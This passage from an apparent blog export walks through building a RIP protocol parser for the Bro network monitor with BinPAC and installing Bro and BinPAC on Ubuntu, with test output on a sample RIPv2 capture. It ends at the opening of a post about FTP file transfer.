want to transfer when the RIP event happens.\nThe RIP packet format is:\n 0 1 2 3\r0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1\r+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\r| command (1) | version (1) | must be zero (2) |\r+---------------+---------------+-------------------------------+\r| |\r~ RIP Entry (20) ~\r| |\r+---------------+---------------+---------------+---------------+\r There may be between 1 and 25 (inclusive) RIP entries. A RIP-1 entry has the following format:\n 0 1 2 3\r0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1\r+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\r| address family identifier (2) | must be zero (2) |\r+-------------------------------+-------------------------------+\r| IPv4 address (4) |\r+---------------------------------------------------------------+\r| must be zero (4) |\r+---------------------------------------------------------------+\r| must be zero (4) |\r+---------------------------------------------------------------+\r| metric (4) |\r+---------------------------------------------------------------+\r Use this file to design the protocol structures of RIP in our case. Just take the structures from the protocol and write the code in this file to parse it.\n Protocol Extensions\rRIP-2 is:\r0 1 2 3 3\r0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1\r+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\r| Address Family Identifier (2) | Route Tag (2) |\r+-------------------------------+-------------------------------+\r| IP Address (4) |\r+---------------------------------------------------------------+\r| Subnet Mask (4) |\r+---------------------------------------------------------------+\r| Next Hop (4) |\r+---------------------------------------------------------------+\r| Metric (4) |\r+---------------------------------------------------------------+\r The Address Family Identifier, IP Address, and Metric all have the meanings defined in section 3.4. The Version field will specify\n1 # Generated by binpac_quickstart 1 2 # ## TODO: Add your protocol structures in here. 3 # ## some examples: 4 5 # Types are your basic building blocks. 6 # There are some builtins, or you can define your own. 7 # Here's a definition for a regular expression: 8 # type RIP_WHITESPACE = RE/[ \\t]*/; 9 10 # A record is a collection of types. 11 # Here's one with the built-in types 12 13 enum Rip_Command { 14 RIP_REQUEST = 1, 15 RIP_RESPONSE = 2, 16 } 17 18 enum Rip_Version { 19 RIP_V1 = 1, 20 RIP_V2 = 2, 21 } 22 23 type Rip_Message = record { //Base Message 24 command : uint8; 25 version : uint8; 26 pad : padding[2]; //must be zero 27 entry : Rip_Entry[] \u0026amp;until($input.length()) == 0; 28 }; 29 30 type Rip_Entry = record {\r31 af : uint16; 32 rt : uint16; 33 ip : uint32; 34 mask : uint32; 35 gateway : uint32; 36 metric : uint32; 37 }; 38 39 type RIP_PDU(is_orig: bool) = record { 40 command : uint8; 41 version : uint8; 42 pad : padding[2]; 43 } \u0026amp;byteorder=bigendian;  RIP_PDU structure: pass to the user land, just focus which you want to pass.\nImplement the rip_analyzer.pac file This file mainly finishes the processing and analyzing of the data which was passed by the RIP_PDU function to this file. If there is a RIP event happens, then it enters this processing flow.\nThe BifEvent::generate_rip_request function illustrates how to generate an request event. We use this event to pass the data structure which is important in the next process (the data structure created in rip_protocol.pac). The main thing we need to define is what we want to pass. Such as: msg.command, msg.version\n%code{ \u0026hellip; %} : Copy C++ code to the generated source file\n1 # Generated by binpac_quickstart 1 2 refine flow RIP_Flow += { 3 function proc_rip_message(msg: RIP_PDU): bool 4 %{ 5 // Check for RIP commands 6 if ( ${msg.command} == RIP_REQUEST) { 7 BifEvent::generate_rip_request(connection()-\u0026gt;bro_analyzer(), connection()-\u0026gt;bro_analyzer()-\u0026gt;Conn(),\r8 ${msg.command}, //Pass more thing 9 ${msg.version}); 10 return true; 11 } 12 if ( ${msg.command} == RIP_RESPONSE) { 13 BifEvent::generate_rip_response(connection()-\u0026gt;bro_analyzer(), connection()-\u0026gt;bro_analyzer()-\u0026gt;Conn(), 14 ${msg.command}, 15 ${msg.version}); 16 return true; 17 } 18 %} 19 }; 20 21 refine typeattr RIP_PDU += \u0026amp;let { 22 proc: bool = $context.flow.proc_rip_message(this); 23 }; ~\r function proc_rip_message(msg: RIP_PDU): bool just like to say please use that RIP_PDU data structure that was defined in the earlier file.\nImplement the events.bif file 1 # Generated by binpac_quickstart 1 2 # In this file, you'll define the events that your analyzer will 3 # generate. A sample event is included. 4 5 # ## TODO: Edit the sample event, and add more events. 6 7 ## Generated for RIP connections 8 ## 9 ## See `Google \u0026lt;http://lmgtfy.com/?q=RIP\u0026gt;`__ for more information about RIP 10 ## 11 ## c: The connection 12 ## 13 event rip_request%(c: connection, command: count, version: count%); 14 event rip_response%(c: connection, command: count, version: count%);\r RIP just have two types of command:\n rip_request rip_response  Test Configure Bro\u0026rsquo;s Working Environment Firstly, we need to configure the bro\u0026rsquo;s path to execute it. The executable path of the Bro is bro/build/src/bro.\nGuoze@node-0:~/00_Workbench/bro$ ./build/src/bro -h\rbro version 2.5-598\rusage: ./build/src/bro [options] [file ...]\r\u0026lt;file\u0026gt; | policy file, or read stdin\r-a|--parse-only | exit immediately after parsing scripts\r-b|--bare-mode | don't load scripts from the base/ directory\r-d|--debug-policy | activate policy file debugging\r-e|--exec \u0026lt;bro code\u0026gt; | augment loaded policies by given code\r-f|--filter \u0026lt;filter\u0026gt; | tcpdump filter\r Bro has provided an executable script for you. As a result, you can easily configure environment variables. We just need to execute the configuration script. Use the shell script for configuring environment variables is as follows:\nGuoze@node-0:~/00_Workbench/bro/build$ cat bro-path-dev.sh export BROPATH=`/users/Guoze/00_Workbench/bro/build/bro-path-dev`\rexport BRO_PLUGIN_PATH=\u0026quot;/users/Guoze/00_Workbench/bro/build/src\u0026quot;:\rexport PATH=\u0026quot;/users/Guoze/00_Workbench/bro/build/src\u0026quot;:$PATH\r Guoze@node-0:~/00_Workbench/bro$ source ./build/bro-path-dev.sh\r If you want to check the execution status of the script and determine whether it has completed the configuration, you can enter: bro -hin the terminal. If the execution result is as same as the result of ./build/src/bro -h, then it means that the configuration has been configured successfully.\nGuoze@node-0:~/00_Workbench/bro$ bro -h\rbro version 2.5-598\rusage: bro [options] [file ...]\r\u0026lt;file\u0026gt; | policy file, or read stdin\r-a|--parse-only | exit immediately after parsing scripts\r-b|--bare-mode | don't load scripts from the base/ directory\r-d|--debug-policy | activate policy file debugging\r-e|--exec \u0026lt;bro code\u0026gt; | augment loaded policies by given code\r-f|--filter \u0026lt;filter\u0026gt; | tcpdump filter\r-g|--dump-config | dump current config into .state dir\r-h|--help|-? | command line help\r Test RIP parser Download RIP Network data We can directly download a RIPv2 packet which can be used for testing on Internet. $ wget http://packetlife.net/captures/RIPv2.cap\nAfter download, use the command \u0026lsquo;tcpdump\u0026rsquo; to determine whether the data packet contains RIP data.\nGuoze@node-0:~/00_Workbench$ tcpdump -nr RIPv2.cap\rreading from file RIPv2.cap, link-type EN10MB (Ethernet)\r23:06:26.942558 IP 10.0.0.1.520 \u0026gt; 224.0.0.9.520: RIPv2, Response, length: 84\r23:06:30.158769 IP 10.0.0.2.520 \u0026gt; 224.0.0.9.520: RIPv2, Response, length: 84\r23:06:52.663855 IP 10.0.0.1.520 \u0026gt; 224.0.0.9.520: RIPv2, Response, length: 84\r23:06:58.416478 IP 10.0.0.2.520 \u0026gt; 224.0.0.9.520: RIPv2, Response, length: 84\r23:07:19.709681 IP 10.0.0.1.520 \u0026gt; 224.0.0.9.520: RIPv2, Response, length: 84\r23:07:24.974047 IP 10.0.0.2.520 \u0026gt; 224.0.0.9.520: RIPv2, Response, length: 84\r23:07:45.389720 IP 10.0.0.1.520 \u0026gt; 224.0.0.9.520: RIPv2, Response, length: 84\r23:07:53.891896 IP 10.0.0.2.520 \u0026gt; 224.0.0.9.520: RIPv2, Response, length: 84\r23:08:14.625084 IP 10.0.0.1.520 \u0026gt; 224.0.0.9.520: RIPv2, Response, length: 84\r23:08:21.933550 IP 10.0.0.2.520 \u0026gt; 224.0.0.9.520: RIPv2, Response, length: 84\r23:08:41.410659 IP 10.0.0.1.520 \u0026gt; 224.0.0.9.520: RIPv2, Response, length: 84\r23:08:47.731064 IP 10.0.0.2.520 \u0026gt; 224.0.0.9.520: RIPv2, Response, length: 84\r Add some print information 12 refine flow RIP_Flow += { 11 function proc_rip_message(msg: RIP_PDU): bool\r10 %{ 9 // Check for RIP commands 8 if ( ${msg.command} == RIP_REQUEST) { 7 printf(\u0026quot;In rip_request\\n\u0026quot;);\r6 BifEvent::generate_rip_request(connection()-\u0026gt;bro_analyzer(), connection()-\u0026gt;bro_analyzer()-\u0026gt;Conn(),\r5 ${msg.command}, 4 ${msg.version}); 3 return true; 2 } 1 if ( ${msg.command} == RIP_RESPONSE) {\r15 printf(\u0026quot;In rip_response\\n\u0026quot;); 1 BifEvent::generate_rip_response(connection()-\u0026gt;bro_analyzer(), connection()-\u0026gt;bro_analyzer()-\u0026gt;Conn(),\r2 ${msg.command}, 3 ${msg.version}); 4 return true; 5 } 6 %}\r After change, make the code again.\nGuoze@node-0:~/00_Workbench/bro$ sudo make\rmake -C build all\rmake[1]: Entering directory '/users/Guoze/00_Workbench/bro/build'\rmake[2]: Entering directory '/users/Guoze/00_Workbench/bro/build'\rmake[3]: Entering directory '/users/Guoze/00_Workbench/bro/build'\rmake[3]: Leaving directory '/users/Guoze/00_Workbench/bro/build'\r........\r........\r[100%] Built target rst\rmake[2]: Leaving directory '/users/Guoze/00_Workbench/bro/build'\rmake[1]: Leaving directory '/users/Guoze/00_Workbench/bro/build'\r Use Network Capture Data for Testing Guoze@node-0:~/00_Workbench$ bro -r RIPv2.cap In rip_response\rIn rip_response\rIn rip_response\rIn rip_response\rIn rip_response\rIn rip_response\rIn rip_response\rIn rip_response\rIn rip_response\rIn rip_response\rIn rip_response\rIn rip_response\r","date":1527193832,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1527193832,"objectID":"0bd9868fe0189d43231d7cfc6eef555d","permalink":"http://www.guozet.me/post/Write-your-first-Analyzer-en/","publishdate":"2018-05-24T20:30:32Z","relpermalink":"/post/Write-your-first-Analyzer-en/","section":"post","summary":"Introduce The best way to understand the structure of the sources code is to write some modules by yourself. Let\u0026rsquo;s us to write an Analyzer in the Bro by Binpac. We choose RIP v2 to write the first protocol.\n","tags":"Network","title":"Complete your first analyzer - RIP in bro","type":"post"},{"authors":null,"categories":"Network","content":"前言 ﻿Bro is a powerful network analysis framework that is much different from the typical IDS you may know.\nBinPAC is a high level language for describing protocol parsers and generates C++ code. It is currently maintained and distributed with the Bro Network Security Monitor distribution, however, the generated parsers may be used with other programs besides Bro.\n软件安装 安装Bro 前期依赖包安装 Bro requires the following libraries and tools to be installed before you begin:\n  Libpcap ( http://www.tcpdump.org) OpenSSL libraries ( http://www.openssl.org) BIND8 library Libz Bash (for BroControl) Python 2.6 or greater (for BroControl)   To build Bro from source, the following additional dependencies are required:\n  CMake 2.8 or greater ( http://www.cmake.org) Make C/C++ compiler with C++11 support (GCC 4.8+ or Clang 3.3+) SWIG ( http://www.swig.org) Bison (GNU Parser Generator) Flex (Fast Lexical Analyzer) Libpcap headers ( http://www.tcpdump.org) OpenSSL headers ( http://www.openssl.org) zlib headers Python   To install the required dependencies, you can use:\n DEB/Debian-based Linux:  sudo apt-get install cmake make gcc g++ flex bison libpcap-dev libssl-dev python-dev swig zlib1g-dev\r Installing from Source Bro releases are bundled into source packages for convenience and are available on the bro downloads page.\nAlternatively, the latest Bro development version can be obtained through git repositories hosted at git.bro.org. See their git development documentation.\ngit clone --recursive git://git.bro.org/bro\rcd bro\rsudo su\r./configure\rmake\rmake install\r 配置环境变量 export PATH=/usr/local/bro/bin:$PATH\n 注意：由于Export的方式，只是在本次登录sh的过程中有效果的，所以后续需要重新配置\n 安装Binpac 依赖包文件 BinPAC relies on the following libraries and tools, which need to be installed before you begin:\n   Flex (Fast Lexical Analyzer) Flex is already installed on most systems, so with luck you can skip having to install it yourself.\n  Bison (GNU Parser Generator)\nBison is also already installed on many system.\n  CMake 2.6.3 or greater\nCMake is a cross-platform, open-source build system, typically not installed by default. See http://www.cmake.org for more information regarding CMake and the installation steps below for how to use it to build this distribution. CMake generates native Makefiles that depend on GNU Make by default\n   Installing from Source To build and install into /usr/local:\ngit clone --recursive git@github.com:bro/binpac.git\rcd binpac\r./configure\rcd build\rmake\rsudo make install\r This will perform an out-of-source build into the build directory using the default build options and then install the binpac binary into /usr/local/bin.\nYou can specify a different installation directory with:\n./configure \u0026ndash;prefix=\nRun ./configure --help for more options.\n下载 BinPAC Sample Analyzer 这个是一个python脚本，能够按照bro的规则生成出Binpac需要书写的文件，生成出来之后，我们只需要填写这些文件就可以了。\nInstalling from Source 从Github上面拷贝例子的文件下来 git clone https://github.com/grigorescu/binpac_quickstart Inside the binpac_quickstart directory, simply run:\npython start.py Sample \u0026quot;Sample Protocol\u0026quot; ../bro --tcp --buffered\nThis will generate all the necessary files for this sample analyzer. The ../bro argument here just points to the Bro source tree. Make sure to change it if yours lives in a different location. See the start.py —helpoptions for more explanation of the options.\nBro should be able to compile the generated template code right away, but files may have some “TODO” comments in them to mark places that typically need to be changed depending on the specifics of the protocol analyzer you want to make.\n遇到的问题 书写Analyzer时候遇到的问题 Bro安装过程中遇到的错误 错误1 ./configure错误 bro# ./configure --with-pcap=/opt/pfring Build Directory : build Source Directory: /root/install/bro CMake Error at CMakeLists.txt:7 (include): include could not find load file:\rcmake/CommonCMakeConfig.cmake\rCMake Error at CMakeLists.txt:52 (include): include could not find load file:\rFindRequiredPackage\r– Found sed: /bin/sed CMake Error at CMakeLists.txt:64 (FindRequiredPackage): Unknown CMake command \u0026quot;FindRequiredPackage\u0026quot;.\r– Configuring incomplete, errors occurred! See also \u0026quot;/root/install/bro/build/CMakeFiles/CMakeOutput.log\u0026quot;.\r 解决方案： 克隆的时候需要添加\u0026ndash;recursive参数，保证自己下载的子模块 git clone --recursive git://git.bro.org/bro\n编译自己书写的Analyzer时候的问题 错误1  make[3]: Entering directory '/users/Guoze/00_Workbench/bro/build'\rmake[3]: *** No rule to make target '../src/binpac', needed by 'src/binpac-lib_pac.h'. Stop.\rmake[3]: Leaving directory '/users/Guoze/00_Workbench/bro/build'\rCMakeFiles/Makefile2:946: recipe for target 'src/CMakeFiles/pac-binpac-lib.pac.dir/all' failed\rmake[2]: *** [src/CMakeFiles/pac-binpac-lib.pac.dir/all] Error 2\rmake[2]: Leaving directory '/users/Guoze/00_Workbench/bro/build'\rMakefile:138: recipe for target 'all' failed\rmake[1]: *** [all] Error 2\rmake[1]: Leaving directory '/users/Guoze/00_Workbench/bro/build'\rMakefile:15: recipe for target 'all' failed\rmake: *** [all] Error 2\r 解决方案： 这个错误很大可能性是你使用了在该文件目录下没有权限，加入sudo make\n错误2 [ 1%] Completed 'project_caf'\rmake[3]: Leaving directory '/users/Guoze/00_Workbench/bro/build'\r[ 2%] Built target project_caf\rmake[2]: Leaving directory '/users/Guoze/00_Workbench/bro/build'\rMakefile:138: recipe for target 'all' failed\rmake[1]: *** [all] Error 2\rmake[1]: Leaving directory '/users/Guoze/00_Workbench/bro/build'\rMakefile:15: recipe for target 'all' failed\rmake: *** [all] Error 2\r 解决方案： 这个错误很大可能性是你使用了make -j 4多核编译的方式导致的，取消多核编译，仅仅使用make\n","date":1527168632,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1527168632,"objectID":"71df8a9302dc0fe23fb4ef44c3c4b9e8","permalink":"http://www.guozet.me/post/Install-bro-Binpac/","publishdate":"2018-05-24T13:30:32Z","relpermalink":"/post/Install-bro-Binpac/","section":"post","summary":"前言 ﻿Bro is a powerful network analysis framework that is much different from the typical IDS you may know.\nBinPAC is a high level language for describing protocol parsers and generates C++ code. It is currently maintained and distributed with the Bro Network Security Monitor distribution, however, the generated parsers may be used with other programs besides Bro.\n","tags":"Network","title":"Ubuntu 16.04安装bro和Binpac","type":"post"},{"authors":null,"categories":"Project","content":"前言 熟悉代码结构最好的方式，就是尝试自己去写一个模块加入到整个系统中，在调试代码的过程中，熟悉代码。\n实现流程 使用Binpac quick start脚本生成自己的Analyzer目录结构 下载Binpac Quick Start脚本 git clone https://github.com/grigorescu/binpac_quickstart.git 下载完成之后，进入该目录，目录结构如下图所示:\nGuoze@node-0:~/00_Workbench$ cd binpac_quickstart/\rGuoze@node-0:~/00_Workbench/binpac_quickstart$ ls -al\rtotal 32\rdrwxr-xr-x 4 Guoze senfv-PG0 4096 May 22 19:30 .\rdrwxr-xr-x 11 Guoze senfv-PG0 4096 May 23 12:15 ..\rdrwxr-xr-x 8 Guoze senfv-PG0 4096 May 22 19:30 .git\r-rw-r--r-- 1 Guoze senfv-PG0 21 May 22 19:30 __init__.py\r-rw-r--r-- 1 Guoze senfv-PG0 128 May 22 19:30 README.md\r-rwxr-xr-x 1 Guoze senfv-PG0 7151 May 22 19:30 start.py\rdrwxr-xr-x 2 Guoze senfv-PG0 4096 May 22 19:30 templates\r 使用脚本生产分析器目录结构 start.py的python就是我们可以用来生成bro中Analyzer的python脚本，使用方式：\nGuoze@node-0:~/00_Workbench/binpac_quickstart$ ./start.py Usage:\rstart.py NAME DESCRIPTION PATH_TO_BRO_SRC (--tcp|--udp) [--buffered] [--plugin]\r  Example: ./start.py RIP \u0026quot;Routing Internet Protocl\u0026quot; ../bro --udp 协议名称：RIP； 协议介绍：Routing Internet Protocl Bro源代码的路径：../bro 底层的网络协议：\u0026ndash;udp\n 我们书写的第一个脚本就是实现RIP协议的解析，RIP协议的详细内容请参考。 在终端输入：./start.py RIP \u0026quot;Routing Internet Protocl\u0026quot; ../bro --udp 执行结束之后分别在bro源代码下两个位置生产文件：\n bro/scripts/base/protocols/rip/  Guoze@node-0:~/00_Workbench/bro/scripts/base/protocols/rip$ ls -l\rtotal 12\r-rw-r--r-- 1 Guoze senfv-PG0 245 May 23 12:49 dpd.sig\r-rw-r--r-- 1 Guoze senfv-PG0 66 May 23 12:49 __load__.bro\r-rw-r--r-- 1 Guoze senfv-PG0 1327 May 23 12:49 main.bro\r  load.bro: This allows all the contents of the directory to be loaded via @load base/protocols/sip. dpd.sig: This file contains a signature that can be used to attach the analyzer to connections if their content matches. main.bro: Contains the base script-layer functionality for processing events emitted from the analyzer.\n  src/analyzer/protocol/sip/  Guoze@node-0:~/00_Workbench/bro/src/analyzer/protocol/rip$ ls -l\rtotal 32\r-rw-r--r-- 1 Guoze senfv-PG0 301 May 23 12:50 CMakeLists.txt\r-rw-r--r-- 1 Guoze senfv-PG0 472 May 23 12:50 events.bif\r-rw-r--r-- 1 Guoze senfv-PG0 480 May 23 12:50 Plugin.cc\r-rw-r--r-- 1 Guoze senfv-PG0 738 May 23 15:27 rip-analyzer.pac\r-rw-r--r-- 1 Guoze senfv-PG0 721 May 23 12:50 RIP.cc\r-rw-r--r-- 1 Guoze senfv-PG0 715 May 23 12:50 RIP.h\r-rw-r--r-- 1 Guoze senfv-PG0 1005 May 23 12:50 rip.pac\r-rw-r--r-- 1 Guoze senfv-PG0 939 May 23 15:03 rip-protocol.pac\r  CMakeLists.txt: Informs the CMake build system how to compile the analyzer. Plugin.cc: Analyzers in Bro are a type of plugin. This file does what’s necessary to register the new analyzer plugin with Bro. RIP.h: Defines the API for the new analyzer which derives from one of Bro’s already-existing analyzer classes. RIP.cc: mplementation of the analyzer. It’s mostly just responsible for handing off data to the protocol parser that’s been generated by BinPAC. events.bif: Defines events that the analyzer will generate. rip.pac: The main entry point for the BinPAC definition of the protocol that you want to parse. rip-protocol.pac: Where the message format is defined.\nrip-analyzer.pac: Defines a connection, flow, and other processing functions for the analyzer.\n 在这些文件当中，我们主要需要完成：\n events.bif rip.pac rip-protocol.pac rip-analyzer.pac  代码实现 rip-protocol.pac文件 这个文件实现的是对RIP协议的组成部分进行定义，以type的方式定义协议数据传输的各个部分。其中RIP_PDU函数是将需要处理的部分传递到分析仪去。\n1 # Generated by binpac_quickstart\r2 # ## TODO: Add your protocol structures in here. 3 # ## some examples: 4 5 # Types are your basic building blocks. 6 # There are some builtins, or you can define your own. 7 # Here's a definition for a regular expression: 8 # type RIP_WHITESPACE = RE/[ \\t]*/; 9 10 # A record is a collection of types. 11 # Here's one with the built-in types 12 13 enum Rip_Command { 14 RIP_REQUEST = 1, 15 RIP_RESPONSE = 2, 16 } 17 18 enum Rip_Version { 19 RIP_V1 = 1, 20 RIP_V2 = 2, 21 } 22 23 type Rip_Message = record { 24 command : uint8; 25 version : uint8; 26 pad : padding[2]; 27 entry : Rip_Entry[] \u0026amp;until($input.length()) == 0; 28 }; 29 30 type Rip_Entry = record {\r31 af : uint16; 32 rt : uint16; 33 ip : uint32; 34 mask : uint32; 35 gateway : uint32; 36 metric : uint32; 37 }; 38 39 type RIP_PDU(is_orig: bool) = record { 40 command : uint8; 41 version : uint8; 42 pad : padding[2]; 43 } \u0026amp;byteorder=bigendian;  rip_analyzer.pac文件实现 该文件主要完成对命令做出对RIP_PDU函数传递过来的数据进行处理解析, 如果有RIP数据包出现那么就进入这个处理流程。\n1 # Generated by binpac_quickstart 1 2 refine flow RIP_Flow += { 3 function proc_rip_message(msg: RIP_PDU): bool 4 %{ 5 // Check for RIP commands 6 if ( ${msg.command} == RIP_REQUEST) { 7 BifEvent::generate_rip_request(connection()-\u0026gt;bro_analyzer(), connection()-\u0026gt;bro_analyzer()-\u0026gt;Conn(),\r8 ${msg.command}, 9 ${msg.version}); 10 return true; 11 } 12 if ( ${msg.command} == RIP_RESPONSE) { 13 BifEvent::generate_rip_response(connection()-\u0026gt;bro_analyzer(), connection()-\u0026gt;bro_analyzer()-\u0026gt;Conn(), 14 ${msg.command}, 15 ${msg.version}); 16 return true; 17 } 18 %} 19 }; 20 21 refine typeattr RIP_PDU += \u0026amp;let { 22 proc: bool = $context.flow.proc_rip_message(this); 23 }; ~\r events.bif文件实现 1 # Generated by binpac_quickstart 1 2 # In this file, you'll define the events that your analyzer will 3 # generate. A sample event is included. 4 5 # ## TODO: Edit the sample event, and add more events. 6 7 ## Generated for RIP connections 8 ## 9 ## See `Google \u0026lt;http://lmgtfy.com/?q=RIP\u0026gt;`__ for more information about RIP 10 ## 11 ## c: The connection 12 ## 13 event rip_request%(c: connection, command: count, version: count%); 14 Event rip_response%(c: connection, command: count, version: count%);\r 测试 配置bro的工作环境 首先需要配置好bro的可执行文件的路径问题： Bro可执行文件的路径在：bro/build/src/bro\nGuoze@node-0:~/00_Workbench/bro$ ./build/src/bro -h\rbro version 2.5-598\rusage: ./build/src/bro [options] [file ...]\r\u0026lt;file\u0026gt; | policy file, or read stdin\r-a|--parse-only | exit immediately after parsing scripts\r-b|--bare-mode | don't load scripts from the base/ directory\r-d|--debug-policy | activate policy file debugging\r-e|--exec \u0026lt;bro code\u0026gt; | augment loaded policies by given code\r-f|--filter \u0026lt;filter\u0026gt; | tcpdump filter\r Bro已经提供了可执行脚本给你，让你可以方便的配置环境变量，所以我们可以直接执行配置脚本就好了。 配置环境变量的shell脚本为：\nGuoze@node-0:~/00_Workbench/bro/build$ cat bro-path-dev.sh export BROPATH=`/users/Guoze/00_Workbench/bro/build/bro-path-dev`\rexport BRO_PLUGIN_PATH=\u0026quot;/users/Guoze/00_Workbench/bro/build/src\u0026quot;:\rexport PATH=\u0026quot;/users/Guoze/00_Workbench/bro/build/src\u0026quot;:$PATH\r 执行脚本完成配置\nGuoze@node-0:~/00_Workbench/bro$ source ./build/bro-path-dev.sh\r 检测脚本执行情况，判断是否完成配置，在终端输入：bro -h, 如果执行结果和执行./build/src/bro -h的结果一致，那么就表示已经配置成功了。\nGuoze@node-0:~/00_Workbench/bro$ bro -h\rbro version 2.5-598\rusage: bro [options] [file ...]\r\u0026lt;file\u0026gt; | policy file, or read stdin\r-a|--parse-only | exit immediately after parsing scripts\r-b|--bare-mode | don't load scripts from the base/ directory\r-d|--debug-policy | activate policy file debugging\r-e|--exec \u0026lt;bro code\u0026gt; | augment loaded policies by given code\r-f|--filter \u0026lt;filter\u0026gt; | tcpdump filter\r-g|--dump-config | dump current config into .state dir\r-h|--help|-? | command line help\r 测试代码 下载RIP的网络数据抓包 直接下载一个RIPv2的数据包就可以用于测试了 $ wget http://packetlife.net/captures/RIPv2.cap 判断数据包是否是包含的RIP数据，能否符合我们的要求？\nGuoze@node-0:~/00_Workbench$ tcpdump -nr RIPv2.cap\rreading from file RIPv2.cap, link-type EN10MB (Ethernet)\r23:06:26.942558 IP 10.0.0.1.520 \u0026gt; 224.0.0.9.520: RIPv2, Response, length: 84\r23:06:30.158769 IP 10.0.0.2.520 \u0026gt; 224.0.0.9.520: RIPv2, Response, length: 84\r23:06:52.663855 IP 10.0.0.1.520 \u0026gt; 224.0.0.9.520: RIPv2, Response, length: 84\r23:06:58.416478 IP 10.0.0.2.520 \u0026gt; 224.0.0.9.520: RIPv2, Response, length: 84\r23:07:19.709681 IP 10.0.0.1.520 \u0026gt; 224.0.0.9.520: RIPv2, Response, length: 84\r23:07:24.974047 IP 10.0.0.2.520 \u0026gt; 224.0.0.9.520: RIPv2, Response, length: 84\r23:07:45.389720 IP 10.0.0.1.520 \u0026gt; 224.0.0.9.520: RIPv2, Response, length: 84\r23:07:53.891896 IP 10.0.0.2.520 \u0026gt; 224.0.0.9.520: RIPv2, Response, length: 84\r23:08:14.625084 IP 10.0.0.1.520 \u0026gt; 224.0.0.9.520: RIPv2, Response, length: 84\r23:08:21.933550 IP 10.0.0.2.520 \u0026gt; 224.0.0.9.520: RIPv2, Response, length: 84\r23:08:41.410659 IP 10.0.0.1.520 \u0026gt; 224.0.0.9.520: RIPv2, Response, length: 84\r23:08:47.731064 IP 10.0.0.2.520 \u0026gt; 224.0.0.9.520: RIPv2, Response, length: 84\r 修改代码，加入测试打印数据 12 refine flow RIP_Flow += { 11 function proc_rip_message(msg: RIP_PDU): bool\r10 %{ 9 // Check for RIP commands 8 if ( ${msg.command} == RIP_REQUEST) { 7 printf(\u0026quot;In rip_request\\n\u0026quot;);\r6 BifEvent::generate_rip_request(connection()-\u0026gt;bro_analyzer(), connection()-\u0026gt;bro_analyzer()-\u0026gt;Conn(),\r5 ${msg.command}, 4 ${msg.version}); 3 return true; 2 } 1 if ( ${msg.command} == RIP_RESPONSE) {\r15 printf(\u0026quot;In rip_response\\n\u0026quot;); 1 BifEvent::generate_rip_response(connection()-\u0026gt;bro_analyzer(), connection()-\u0026gt;bro_analyzer()-\u0026gt;Conn(),\r2 ${msg.command}, 3 ${msg.version}); 4 return true; 5 } 6 %}\r 修改代码完成之后，重新编译代码:\nGuoze@node-0:~/00_Workbench/bro$ sudo make\rmake -C build all\rmake[1]: Entering directory '/users/Guoze/00_Workbench/bro/build'\rmake[2]: Entering directory '/users/Guoze/00_Workbench/bro/build'\rmake[3]: Entering directory '/users/Guoze/00_Workbench/bro/build'\rmake[3]: Leaving directory '/users/Guoze/00_Workbench/bro/build'\r........\r........\r[100%] Built target rst\rmake[2]: Leaving directory '/users/Guoze/00_Workbench/bro/build'\rmake[1]: Leaving directory '/users/Guoze/00_Workbench/bro/build'\r 结尾和我上述结果类似的话，表示编译通过。\n使用网络抓包数据进行测试 使用Bro导入这个数据包进行测试\nGuoze@node-0:~/00_Workbench$ bro -r RIPv2.cap In rip_response\rIn rip_response\rIn rip_response\rIn rip_response\rIn rip_response\rIn rip_response\rIn rip_response\rIn rip_response\rIn rip_response\rIn rip_response\rIn rip_response\rIn rip_response\r 提升理解 在前面的部分，并没有去处理scripts/base/protocols/rip/目录下面的文件，接下来我们需要来理解这几个文件。\nGuoze@node-0:~/00_Workbench/bro/scripts/base/protocols/rip$ ls -l\rtotal 12\r-rw-r--r-- 1 Guoze senfv-PG0 245 May 23 12:49 dpd.sig\r-rw-r--r-- 1 Guoze senfv-PG0 66 May 23 12:49 __load__.bro\r-rw-r--r-- 1 Guoze senfv-PG0 1327 May 23 12:49 main.bro\r  load.bro: This allows all the contents of the directory to be loaded via @load base/protocols/sip. dpd.sig: This file contains a signature that can be used to attach the analyzer to connections if their content matches. main.bro: Contains the base script-layer functionality for processing events emitted from the analyzer.\n load.bro理解 这个文件加载了所有的内容到Bro中去。\ndpd.sig (digital protocol detection scripts) 当你找出来匹配你定义的特殊的协议的时候，他就会生成和调用对应的分析器去处理，我们可以这里定义它需要处理的接口\nmain.bro 这个文件包含了所有的基本工作和所有分析器内容，Bro首先云心的内容\n\u0026lt;未完待续\u0026gt;\n","date":1527107432,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1527107432,"objectID":"a30db8bc5ae0fa71152ed4c8bcba205b","permalink":"http://www.guozet.me/post/Write-first-Analyzer-rip/","publishdate":"2018-05-23T20:30:32Z","relpermalink":"/post/Write-first-Analyzer-rip/","section":"post","summary":"前言 熟悉代码结构最好的方式，就是尝试自己去写一个模块加入到整个系统中，在调试代码的过程中，熟悉代码。\n","tags":"Network","title":"在Bro中完成第一个协议分析器—RIP协议","type":"post"},{"authors":null,"categories":"Computer Network","content":"前言 在实际网络环境中很多时候我们需要在局域网内两台电脑之间，外网与局域网内部的电脑之间完成大文件的传输，在这里就会出现一个小问题，常规的小文件我们只需要使用QQ或者Skype这一类的即时聊天软件就可以办到，但是当我们的文件有几十个G那么大的时候，局域网内与外网之间进行大文件传输就没有那么方便了。\n背景 我的主机：Windows 10 旗舰版(路由器下面的局域网内)\n对方主机：Mac(不与我的主机在一个局域网内)\n要求: 需要将大约30G的10个视频文件传送到对方主机上面\n解决方式 由于视频文件单个文件超过的2G,使用常规的即时通信软件，无法满足我的需求。考虑到自己对FTP传输比较熟悉，选择搭建FTP服务器来进行传输。这里有以下几个步骤：\n 我的主机上面搭建FTP服务器，并本地测试通过 